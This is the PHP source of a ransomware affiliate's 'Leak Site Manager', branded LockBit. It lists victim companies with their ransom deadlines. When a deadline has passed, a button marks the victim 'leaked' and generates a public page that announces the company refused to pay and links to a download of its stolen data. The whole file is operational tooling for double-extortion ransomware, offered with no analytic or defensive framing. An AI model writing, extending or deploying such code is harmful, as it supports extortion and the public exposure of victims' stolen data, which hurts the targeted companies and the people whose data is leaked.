<?php
session_start();
if (!isset($_SESSION['affiliate_id'])) { header('Location: index.php'); exit; }
require_once 'config/database.php';

// Handle publish
if (isset($_GET['publish_id'])) {
    $victimId = $_GET['publish_id'];
    $stmt = $db->prepare("UPDATE victims SET status = 'leaked', leaked_at = NOW() WHERE id = ? AND affiliate_id = ?");
    $stmt->execute([$victimId, $_SESSION['affiliate_id']]);
    
    // Publish to leak site
    $stmt = $db->prepare("SELECT * FROM victims WHERE id = ?");
    $stmt->execute([$victimId]);
    $victim = $stmt->fetch(PDO::FETCH_ASSOC);
    
    // Generate leak page
    $leakContent = generateLeakPage($victim);
    file_put_contents("../leaks/{$victim['victim_id']}.html", $leakContent);
}

function generateLeakPage($victim) {
    $html = "<!DOCTYPE html><html><head><title>LOCKBIT LEAK - {$victim['company_name']}</title>";
    $html .= "<style>body{background:#000;color:#f00;font-family:monospace;}</style></head><body>";
    $html .= "<h1>🔴 LOCKBIT DATA LEAK</h1>";
    $html .= "<h2>{$victim['company_name']}</h2>";
    $html .= "<p>Company refused to pay. Data published as promised.</p>";
    $html .= "<p>Data Size: {$victim['data_size']}</p>";
    $html .= "<a href='{$victim['download_link']}'>Download Data</a>";
    $html .= "</body></html>";
    return $html;
}

$stmt = $db->prepare("SELECT * FROM victims WHERE affiliate_id = ? ORDER BY created_at DESC");
$stmt->execute([$_SESSION['affiliate_id']]);
$victims = $stmt->fetchAll(PDO::FETCH_ASSOC);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Leak Site Manager - LockBit</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0a0a0a; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; }
        .header { background: #111; padding: 20px; margin-bottom: 20px; border: 1px solid #333; }
        h1 { color: #ff0000; }
        table { width: 100%; border-collapse: collapse; background: #111; }
        th, td { padding: 12px; border: 1px solid #222; }
        th { background: #1a1a1a; color: #ff0000; }
        .btn { background: #ff0000; color: #fff; padding: 5px 10px; margin: 2px; text-decoration: none; display: inline-block; }
        .status-leaked { color: #ff0000; }
        .status-published { color: #ffff00; }
    </style>
</head>
<body>
    <div class="header">
        <h1>📢 LEAK SITE MANAGER</h1>
        <a href="dashboard.php" style="color:#00ff00;">Back to Dashboard</a>
    </div>
    <table>
        <thead>
            <tr>
                <th>Company</th>
                <th>Status</th>
                <th>Data Size</th>
                <th>Deadline</th>
                <th>Actions</th>
            </tr>
        </thead>
        <tbody>
            <?php foreach ($victims as $victim): ?>
            <tr>
                <td><?php echo htmlspecialchars($victim['company_name']); ?></td>
                <td class="status-<?php echo $victim['status']; ?>"><?php echo strtoupper($victim['status']); ?></td>
                <td><?php echo $victim['data_size'] ?? 'N/A'; ?></td>
                <td><?php echo $victim['deadline']; ?></td>
                <td>
                    <?php if ($victim['status'] == 'encrypted' && strtotime($victim['deadline']) < time()): ?>
                    <a href="?publish_id=<?php echo $victim['id']; ?>" class="btn">PUBLISH LEAK</a>
                    <?php endif; ?>
                    <?php if ($victim['status'] == 'leaked'): ?>
                    <a href="../leaks/<?php echo $victim['victim_id']; ?>.html" class="btn">VIEW LEAK</a>
                    <?php endif; ?>
                </td>
            </tr>
            <?php endforeach; ?>
        </tbody>
    </table>
</body>
</html>
